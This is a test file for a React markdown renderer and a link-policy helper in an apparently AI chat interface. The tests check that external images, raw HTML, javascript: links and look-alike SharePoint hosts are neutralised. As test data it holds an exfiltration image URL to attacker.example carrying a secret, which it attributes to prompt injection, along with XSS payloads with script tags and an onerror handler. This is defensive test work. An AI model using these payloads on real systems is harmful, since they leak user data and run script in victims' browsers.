import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { SafeMarkdown } from "../SafeMarkdown";
import { getLinkDisplayInfo } from "../linkPolicy";

const render = (content: string) =>
    renderToStaticMarkup(<SafeMarkdown content={content} />);

describe("SafeMarkdown", () => {
    it("never renders external images (exfiltration via prompt injection)", () => {
        const html = render("![dato](https://attacker.example/p.png?d=secreto)");

        expect(html).not.toContain("<img");
        expect(html).not.toContain("attacker.example");
        expect(html).toContain("[Imagen omitida: dato]");
    });

    it("escapes raw HTML instead of rendering it", () => {
        const html = render('<script>alert(1)</script><img src=x onerror="alert(1)">');

        expect(html).not.toContain("<script");
        expect(html).not.toContain("<img");
        expect(html).not.toContain("onerror=\"");
    });

    it("does not render javascript: links as clickable", () => {
        const html = render("[clic](javascript:alert(1))");

        expect(html).not.toContain("javascript:");
        expect(html).not.toContain("<a");
    });

    it("opens external links in a new tab without opener and shows the domain", () => {
        const html = render("[Fuente oficial](https://ejemplo.com/informe)");

        expect(html).toContain('target="_blank"');
        expect(html).toContain('rel="noopener noreferrer nofollow"');
        expect(html).toContain("(ejemplo.com)");
    });

    it("renders CONSEIN SharePoint links as the generated-file call to action", () => {
        const html = render(
            "[Battlecard](https://conseincloud.sharepoint.com/sites/x/doc.docx)"
        );

        expect(html).toContain("Abrir archivo generado");
        expect(html).toContain("message-link--generated-file");
    });

    it("wraps tables in a scrollable region", () => {
        const html = render("| a | b |\n|---|---|\n| 1 | 2 |");

        expect(html).toContain('role="region"');
        expect(html).toContain("<table");
    });
});

describe("getLinkDisplayInfo", () => {
    it("does not treat look-alike hosts as CONSEIN SharePoint", () => {
        const info = getLinkDisplayInfo(
            "https://conseincloud.sharepoint.com.attacker.example/doc",
            "doc"
        );

        expect(info?.kind).toBe("external");
    });

    it("requires https for SharePoint files", () => {
        const info = getLinkDisplayInfo(
            "http://conseincloud.sharepoint.com/doc",
            "doc"
        );

        expect(info?.kind).toBe("external");
    });

    it("hides the domain hint when the visible text already shows it", () => {
        const info = getLinkDisplayInfo("https://ejemplo.com", "ejemplo.com");

        expect(info).toMatchObject({ kind: "external", showDomain: false });
    });

    it.each(["data:text/html,hi", "ftp://x.example/a", "/relative", "not a url"])(
        "rejects %s",
        (href) => {
            expect(getLinkDisplayInfo(href, "x")).toBeNull();
        }
    );
});
